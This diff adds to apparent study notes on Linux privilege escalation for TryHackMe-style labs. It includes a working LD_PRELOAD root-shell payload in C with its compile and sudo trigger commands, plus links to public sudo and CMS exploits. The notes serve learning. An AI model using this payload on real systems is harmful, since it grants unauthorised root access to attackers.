@@ -1,3 +1,6 @@
+## Warning
+- if you found any command that you dont understand, you can check it [here](https://explainshell.com)
+
 ## OS Information Gathering
 - hostname
 - uname -a 
@@ -135,3 +138,51 @@ Example: [wget](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthroug
 
 What is LD_PRELOAD ?
 
+LD_PRELOAD is an environment variable used in Unix-like operating systems to specify a shared library that should be loaded before any other library. This library is then searched for functions before the standard libraries.
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init(){
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+- unsetenv("LD_PRELOAD"): Removes the LD_PRELOAD environment variable from the process's environment. This is done to prevent any other libraries specified in LD_PRELOAD from being loaded after this one.
+  
+- setgid(0): Sets the group ID (gid) of the current process to 0 (root group).
+
+- setuid(0): Sets the user ID (uid) of the current process to 0 (root user).
+
+- system("/bin/bash"): Executes the /bin/bash shell as a subprocess with the newly set user and group IDs (i.e., as the root user).
+
+![alt text](image-31.png)
+
+- The command gcc -fPIC -shared -o shell.so shell.c -nostartfiles compiles the shell.c code as a Position Independent Executable (PIE) shared library named shell.so. The -nostartfiles flag is used to prevent the linker from adding the standard library startup files
+
+- The command sudo LD_PRELOAD=/home/user/shell.so apache2 sets the LD_PRELOAD environment variable to point to the shell.so library and runs the Apache2 web server with elevated privileges (as root). Here's what happens:
+
+## TryHackMe Room (Simple CTF)
+
+dirsearch - https://github.com/maurosoria/dirsearch
+![alt text](image-32.png)
+
+Exploit-DB for Simple CMS - https://www.exploit-db.com/exploits/46635
+
+![alt text](image-33.png)
+![alt text](image-34.png)
+![alt text](image-35.png)
+
+## CVE-2019-14287 (Sudo Security Bypass thm)
+
+- Exploit-DB for CVE-2019-14287 - https://www.exploit-db.com/exploits/47502
+
+## Overview and Escalation via CVE-2019-18634 (Sudo Buffer Overflow)
+
+- Exploit for CVE-2019-18634 - https://github.com/saleemrashid/sudo-cve-2019-18634
+
+## Escalation Path SUID
